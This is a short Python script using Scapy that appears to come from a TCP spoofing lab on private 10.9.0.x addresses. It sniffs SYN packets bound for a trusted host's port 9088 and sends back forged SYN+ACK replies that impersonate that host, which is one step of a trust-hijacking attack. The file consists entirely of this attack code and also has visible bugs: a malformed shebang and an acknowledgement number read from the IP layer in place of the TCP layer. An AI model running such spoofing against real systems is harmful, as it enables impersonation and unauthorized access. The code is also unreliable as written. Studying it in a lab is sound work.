#!usr/bin/python3
from scapy.all import *
import sys

X_IP_Address = "10.9.0.3"
X_Tml_PortNo = 1021
Trusted_IP_Address = "10.9.0.4"
Trusted_PortNo = 9088

def spoof_pkt(pkt):
	sequence_no = 110086204
	previous_ip = pkt[IP]
	previous_tcp = pkt[TCP]

	if previous_tcp.flags == "S":
		print("Sending Spoofed SYN+ACK Packet ...")
		IP_Layer = IP(src=Trusted_IP_Address, dst=X_IP_Address)
		TCP_Layer = TCP(sport=Trusted_PortNo,dport=X_Tml_PortNo,flags="SA",
		 seq=sequence_no, ack= previous_ip.seq + 1)
		pkt = IP_Layer/TCP_Layer
		send(pkt,verbose=0)

pkt = sniff(filter="tcp and dst host 10.9.0.4 and dst port 9088", prn=spoof_pkt)
